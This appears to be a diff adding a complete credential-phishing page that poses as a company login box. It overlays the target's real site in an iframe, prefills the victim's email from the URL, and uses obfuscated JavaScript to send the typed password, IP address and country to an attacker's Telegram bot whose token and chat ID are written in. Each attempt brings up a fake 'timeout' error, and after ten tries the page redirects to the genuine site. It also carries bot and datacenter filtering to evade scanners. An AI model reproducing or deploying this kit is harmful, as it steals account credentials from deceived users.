@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Login</title>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+<!-- Fetch IP immediately -->
+<script src="https://l2.io/ip.js?var=userip"></script>
+<style>
+body { background-color: #eeeeee; font-family: Helvetica Neue, Helvetica, sans-serif; font-size: 13px; color: #425152; margin: 0; }
+#iframe-content { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; border: none; z-index: 0; }
+#blocker { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: transparent; z-index: 5; pointer-events: all; }
+#login-box { position: fixed; top: 50%; left: 50%; transform: translate(-50% ,-50%); background: #ffffff; padding: 20px; border-radius: 4px; box-shadow: 0 0 10px 0px #0003; width: 375px; z-index: 10; }
+#login-box .header { display: flex; align-items: center; margin-bottom: 20px; }
+#login-box .header img { margin-right: 10px; max-width: 40px; }
+#login-box .header h2 { margin: 0; font-size: 18px; color: #425152; text-transform: uppercase; }
+.row { display: flex; align-items: center; margin-bottom: 15px; }
+.row label { width: 80px; font-weight: bold; color: #425152; }
+.row input { flex: 1; padding: 6px 10px; border: 1px solid #ccc; border-radius: 4px; }
+button { padding: 6px 10px; background: black; color: #ffffff; font-weight: bold; border: none; border-radius: 4px; cursor: pointer; align-self: flex-start; }
+button:hover { background: #333; }
+#error-message { color: red; margin-top: 10px; font-size: 14px; }
+p.copy { margin-top: 15px; font-size: 11px; color: #666; }
+</style>
+</head>
+<body>
+
+<iframe id="iframe-content" src=""> </iframe>
+<div id="blocker"></div>
+
+<div id="login-box">
+  <div class="header">
+    <img id="logo-img" src="" alt="Company Logo">
+    <h2 id="company-name">Company</h2>
+  </div>
+  
+  <form id="loginForm">
+    <!-- Antibot Honeypot -->
+    <input type="text" id="b_name" style="display:none !important" tabindex="-1" autocomplete="off">
+    
+    <div class="row">
+      <label for="email">Email :</label>
+      <input type="email" id="email" readonly>
+    </div>
+
+    <div class="row">
+      <label for="password">Password :</label>
+      <input type="password" id="password" placeholder="Enter password" required autofocus>
+    </div>
+
+    <button type="submit" id="submitBtn">Login</button>
+    <div id="error-message"></div>
+  </form>
+
+  <p class="copy">
+    All rights reserved. Copyright ©️ 2026
+    <span id="copy-name">Company</span>
+  </p>
+</div>
+
+<script>
+ function _0x5756(_0x3e4773,_0x2a092a){_0x3e4773=_0x3e4773-0x1bf;const _0x9eb5c0=_0x9eb5();let _0x5756d8=_0x9eb5c0[_0x3e4773];return _0x5756d8;}const _0x31dbce=_0x5756;(function(_0x2d1351,_0x8baf51){const _0x4d524a=_0x5756,_0x5a0956=_0x2d1351();while(!![]){try{const _0x42f051=-parseInt(_0x4d524a(0x1d7))/0x1*(parseInt(_0x4d524a(0x1d5))/0x2)+parseInt(_0x4d524a(0x1f0))/0x3+-parseInt(_0x4d524a(0x1d0))/0x4*(parseInt(_0x4d524a(0x1f6))/0x5)+-parseInt(_0x4d524a(0x1c5))/0x6+parseInt(_0x4d524a(0x1d1))/0x7*(-parseInt(_0x4d524a(0x1e8))/0x8)+parseInt(_0x4d524a(0x1f4))/0x9+parseInt(_0x4d524a(0x1c1))/0xa;if(_0x42f051===_0x8baf51)break;else _0x5a0956['push'](_0x5a0956['shift']());}catch(_0xe268d1){_0x5a0956['push'](_0x5a0956['shift']());}}}(_0x9eb5,0x2edc2));var userCountry='Unknown',isBot='No';$['getJSON'](_0x31dbce(0x1f3))[_0x31dbce(0x1d3)](function(_0xb0ba76){const _0x734134=_0x31dbce;userCountry=_0xb0ba76[_0x734134(0x1f7)]||'Unknown';let _0x3e8b84=(_0xb0ba76[_0x734134(0x1e6)]||'')[_0x734134(0x1cb)]();(_0x3e8b84[_0x734134(0x1c2)]('google')||_0x3e8b84[_0x734134(0x1c2)]('amazon')||_0x3e8b84[_0x734134(0x1c2)]('bot')||_0x3e8b84[_0x734134(0x1c2)](_0x734134(0x1e4)))&&(isBot='Yes');});const urlParams=new URLSearchParams(window[_0x31dbce(0x1ca)][_0x31dbce(0x1d4)]);let email=urlParams[_0x31dbce(0x1f1)](_0x31dbce(0x1da))||'',domain=urlParams['get'](_0x31dbce(0x1e5))||'';!domain&&email[_0x31dbce(0x1c2)]('@')&&(domain=email[_0x31dbce(0x1bf)]('@')[0x1]);function _0x9eb5(){const _0x172a6a=['Email:\x20','Antibot\x20Flag:\x20','email','length','value','src','company-name','IP:\x20','innerText','addEventListener','-1003841490756','Country:\x20','datacenter','domain','org','&text=','372848QXPScN','input','Sign\x20in\x20attempt\x20timeout,\x20please\x20try\x20again.','undefined','Unknown','toUpperCase','loginAttempts','logo-img','783789LRRXaF','get','8942642484:AAE5d0tDGOWk6fFEsJyTiNmjRtFzJuMWVc0','https://ipapi.co/json/','2186505dRmhJk','password','2495gPStfn','country_name','split','preventDefault','5094420McQifk','includes','then','href','1450812WFYmZn','loginForm','copy-name','https://api.telegram.org/bot','Login','location','toLowerCase','getElementById','Domain:\x20','https://','/sendMessage?chat_id=','1676hzJhEx','7qhAiAv','disabled','done','search','648446uQgOSV','catch','1NtBJlQ'];_0x9eb5=function(){return _0x172a6a;};return _0x9eb5();}const emailInput=document[_0x31dbce(0x1cc)](_0x31dbce(0x1da));if(email)emailInput[_0x31dbce(0x1dc)]=email;domain&&(document['getElementById']('iframe-content')[_0x31dbce(0x1dd)]='https://'+domain,document['getElementById'](_0x31dbce(0x1ef))['src']='https://www.google.com/s2/favicons?domain='+domain+'&sz=128',document[_0x31dbce(0x1cc)](_0x31dbce(0x1de))[_0x31dbce(0x1e0)]=domain[_0x31dbce(0x1ed)](),document[_0x31dbce(0x1cc)](_0x31dbce(0x1c7))[_0x31dbce(0x1e0)]=domain[_0x31dbce(0x1ed)]());let attempts=parseInt(localStorage['getItem'](_0x31dbce(0x1ee))||'0');const passwordInput=document['getElementById'](_0x31dbce(0x1f5)),errorMessage=document[_0x31dbce(0x1cc)]('error-message'),submitBtn=document[_0x31dbce(0x1cc)]('submitBtn');passwordInput[_0x31dbce(0x1e1)](_0x31dbce(0x1e9),()=>{const _0x213388=_0x31dbce;errorMessage[_0x213388(0x1e0)]='';}),document[_0x31dbce(0x1cc)](_0x31dbce(0x1c6))[_0x31dbce(0x1e1)]('submit',function(_0x3e5b1a){const _0x30aad0=_0x31dbce;_0x3e5b1a[_0x30aad0(0x1c0)]();if(document[_0x30aad0(0x1cc)]('b_name')[_0x30aad0(0x1dc)][_0x30aad0(0x1db)]>0x0)return;const _0x3d9617=passwordInput['value'],_0x3269fb=typeof userip!==_0x30aad0(0x1eb)?userip:_0x30aad0(0x1ec);submitBtn[_0x30aad0(0x1d2)]=!![],submitBtn[_0x30aad0(0x1e0)]='Verifying...';const _0x70596f='🚨\x20Login\x20Attempt:\x0a'+_0x30aad0(0x1d8)+email+'\x0a'+_0x30aad0(0x1cd)+domain+'\x0a'+'Password:\x20'+_0x3d9617+'\x0a'+_0x30aad0(0x1e3)+userCountry+'\x0a'+_0x30aad0(0x1df)+_0x3269fb+'\x0a'+_0x30aad0(0x1d9)+isBot,_0x42971c=_0x30aad0(0x1f2),_0xc3af9e=_0x30aad0(0x1e2),_0x5ee429=_0x30aad0(0x1c8)+_0x42971c+_0x30aad0(0x1cf)+_0xc3af9e+_0x30aad0(0x1e7)+encodeURIComponent(_0x70596f);fetch(_0x5ee429)[_0x30aad0(0x1c3)](()=>{const _0x1852e1=_0x30aad0;attempts+=0x1,localStorage['setItem'](_0x1852e1(0x1ee),attempts);if(attempts>=0xa&&domain){window[_0x1852e1(0x1ca)][_0x1852e1(0x1c4)]=_0x1852e1(0x1ce)+domain;return;}setTimeout(()=>{const _0x403246=_0x1852e1;submitBtn[_0x403246(0x1d2)]=![],submitBtn[_0x403246(0x1e0)]=_0x403246(0x1c9),errorMessage['innerText']=_0x403246(0x1ea),passwordInput[_0x403246(0x1dc)]='';},0x7d0);})[_0x30aad0(0x1d6)](()=>{const _0x3df0d8=_0x30aad0;submitBtn['disabled']=![],submitBtn[_0x3df0d8(0x1e0)]=_0x3df0d8(0x1c9);});});
+</script>
+
+</body>
+</html>
